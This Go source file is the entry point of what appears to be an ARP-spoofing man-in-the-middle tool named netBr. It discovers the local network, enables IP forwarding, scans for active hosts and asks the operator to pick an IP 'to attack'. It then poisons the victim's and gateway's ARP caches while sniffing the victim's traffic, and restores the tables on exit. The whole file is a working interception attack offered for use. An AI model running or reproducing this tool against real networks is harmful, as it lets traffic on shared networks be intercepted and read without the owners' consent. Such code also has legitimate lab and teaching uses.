package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"os/signal"
	"sync"
	"syscall"

	"github.com/KennyZ69/netBr/pkg"
	ipkg "github.com/KennyZ69/netBr/pkg/ip"
	"github.com/KennyZ69/netBr/sniff"
	"github.com/KennyZ69/netBr/spoof"
)

func main() {
	// just testing pkg now

	cfg, err := pkg.LoadConf()
	if err != nil || cfg == nil {
		// log.Println("Getting ifi")
		ifi, err := pkg.GetInterface()
		if err != nil {
			log.Fatalf("Error: Could not get interface in main func: %s\n", err)
		}

		// log.Println("Getting Mac")
		ownMac, err := pkg.GetOwnMac(ifi)
		if err != nil {
			log.Fatalf("Error: Could not get own mac address: %s\n", err)
		}

		// log.Println("Getting IP")
		ip, cidr, err := ipkg.GetIpRange(ifi)
		if err != nil {
			log.Fatalf("Error: Could not get local ip address: %s\n", err)
		}

		gateway, err := ipkg.GetGateway()
		if err != nil && gateway == nil {
			log.Fatalf("Error: Could not get the Gateway IP address: %s\n", err)
		}

		cfg = &pkg.Config{
			NetIfi:  ifi,
			LocalIP: ip,
			Mac:     ownMac,
			CIDR:    cidr,
			Gateway: gateway.String(),
		}
		if err = pkg.SaveConf(cfg); err != nil {
			log.Fatalf("Error saving config file: %s\n", err)
		}
	}

	fmt.Printf("Gotten ifi: %s\n", cfg.NetIfi.Name)
	fmt.Printf("Gotten ip: %s\n", cfg.LocalIP)
	fmt.Printf("Gotten mac: %s\n", cfg.Mac)
	fmt.Printf("Gotten CIDR: %s\n", cfg.CIDR)
	if cfg.Gateway == "" { // or "<nil>"
		gateway, _ := ipkg.GetGateway()
		cfg.Gateway = gateway.String()
	}
	fmt.Printf("Gotten Gateway IP: %s\n", cfg.Gateway)

	if err := enableIpForwarding(); err != nil {
		log.Fatalf("Error enabling packet forwarding: %s\n", err)
	}

	// activeIPs, err := ipkg.HighListIPs(cfg.CIDR, cfg.NetIfi, cfg.LocalIP)
	activeIPs, err := ipkg.HighListIPs(*cfg)
	if err != nil {
		log.Fatalf("Error somewhere in HighListIPs: %s\n", err)
	} else if activeIPs == nil {
		log.Fatalf("No active IP addresses were found\n")
	}

	fmt.Println("Active IPs:", activeIPs)

	targetIP := chooseVictimIP(activeIPs)
	fmt.Println("Chosen target", targetIP.String())

	gatewayMAC, err := pkg.GetMacFromIP(net.ParseIP(cfg.Gateway), cfg.NetIfi)
	if err != nil {
		log.Fatalf("Error getting gateway MAC addr: %s\n", err)
	}
	targetMAC, err := pkg.GetMacFromIP(targetIP, cfg.NetIfi)
	if err != nil {
		log.Fatalf("Error getting target MAC addr: %s\n", err)
	}

	var wg sync.WaitGroup

	handleExit(cfg.NetIfi, targetIP, net.ParseIP(cfg.Gateway), targetMAC, gatewayMAC)

	wg.Add(1)
	go func() {
		defer wg.Done()
		spoof.SpoofARP(cfg.NetIfi, targetIP, net.ParseIP(cfg.Gateway), net.HardwareAddr(cfg.Mac), targetMAC, gatewayMAC)

	}()

	wg.Add(1)
	go func() {
		defer wg.Done()
		sniff.Sniff(cfg.NetIfi, cfg.Mac, targetIP.String(), cfg.Gateway)
	}()

	wg.Wait()
}

func chooseVictimIP(activeIPs []net.IP) net.IP {
	var idx int

	for {
		fmt.Println("Choose the number of the IP to attack")
		fmt.Scanln(&idx)
		if idx > len(activeIPs) || idx < 1 {
			continue
		}
		return activeIPs[idx-1]
	}

}

func enableIpForwarding() error {
	return os.WriteFile("/proc/sys/net/ipv4/ip_forward", []byte("1"), 0644)
}

// handleExit captures termination (exit) signals to then restore arp tables to their original (healthy) state
func handleExit(ifi *net.Interface, victimIP, gatewayIP net.IP, victimMAC, gatewayMAC net.HardwareAddr) {
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, os.Kill, syscall.SIGTERM)

	go func() {
		<-sigChan // when one of those signals gets to the channel
		spoof.RestoreArpTables(ifi, victimIP, gatewayIP, victimMAC, gatewayMAC)
		os.Exit(0)
	}()
}
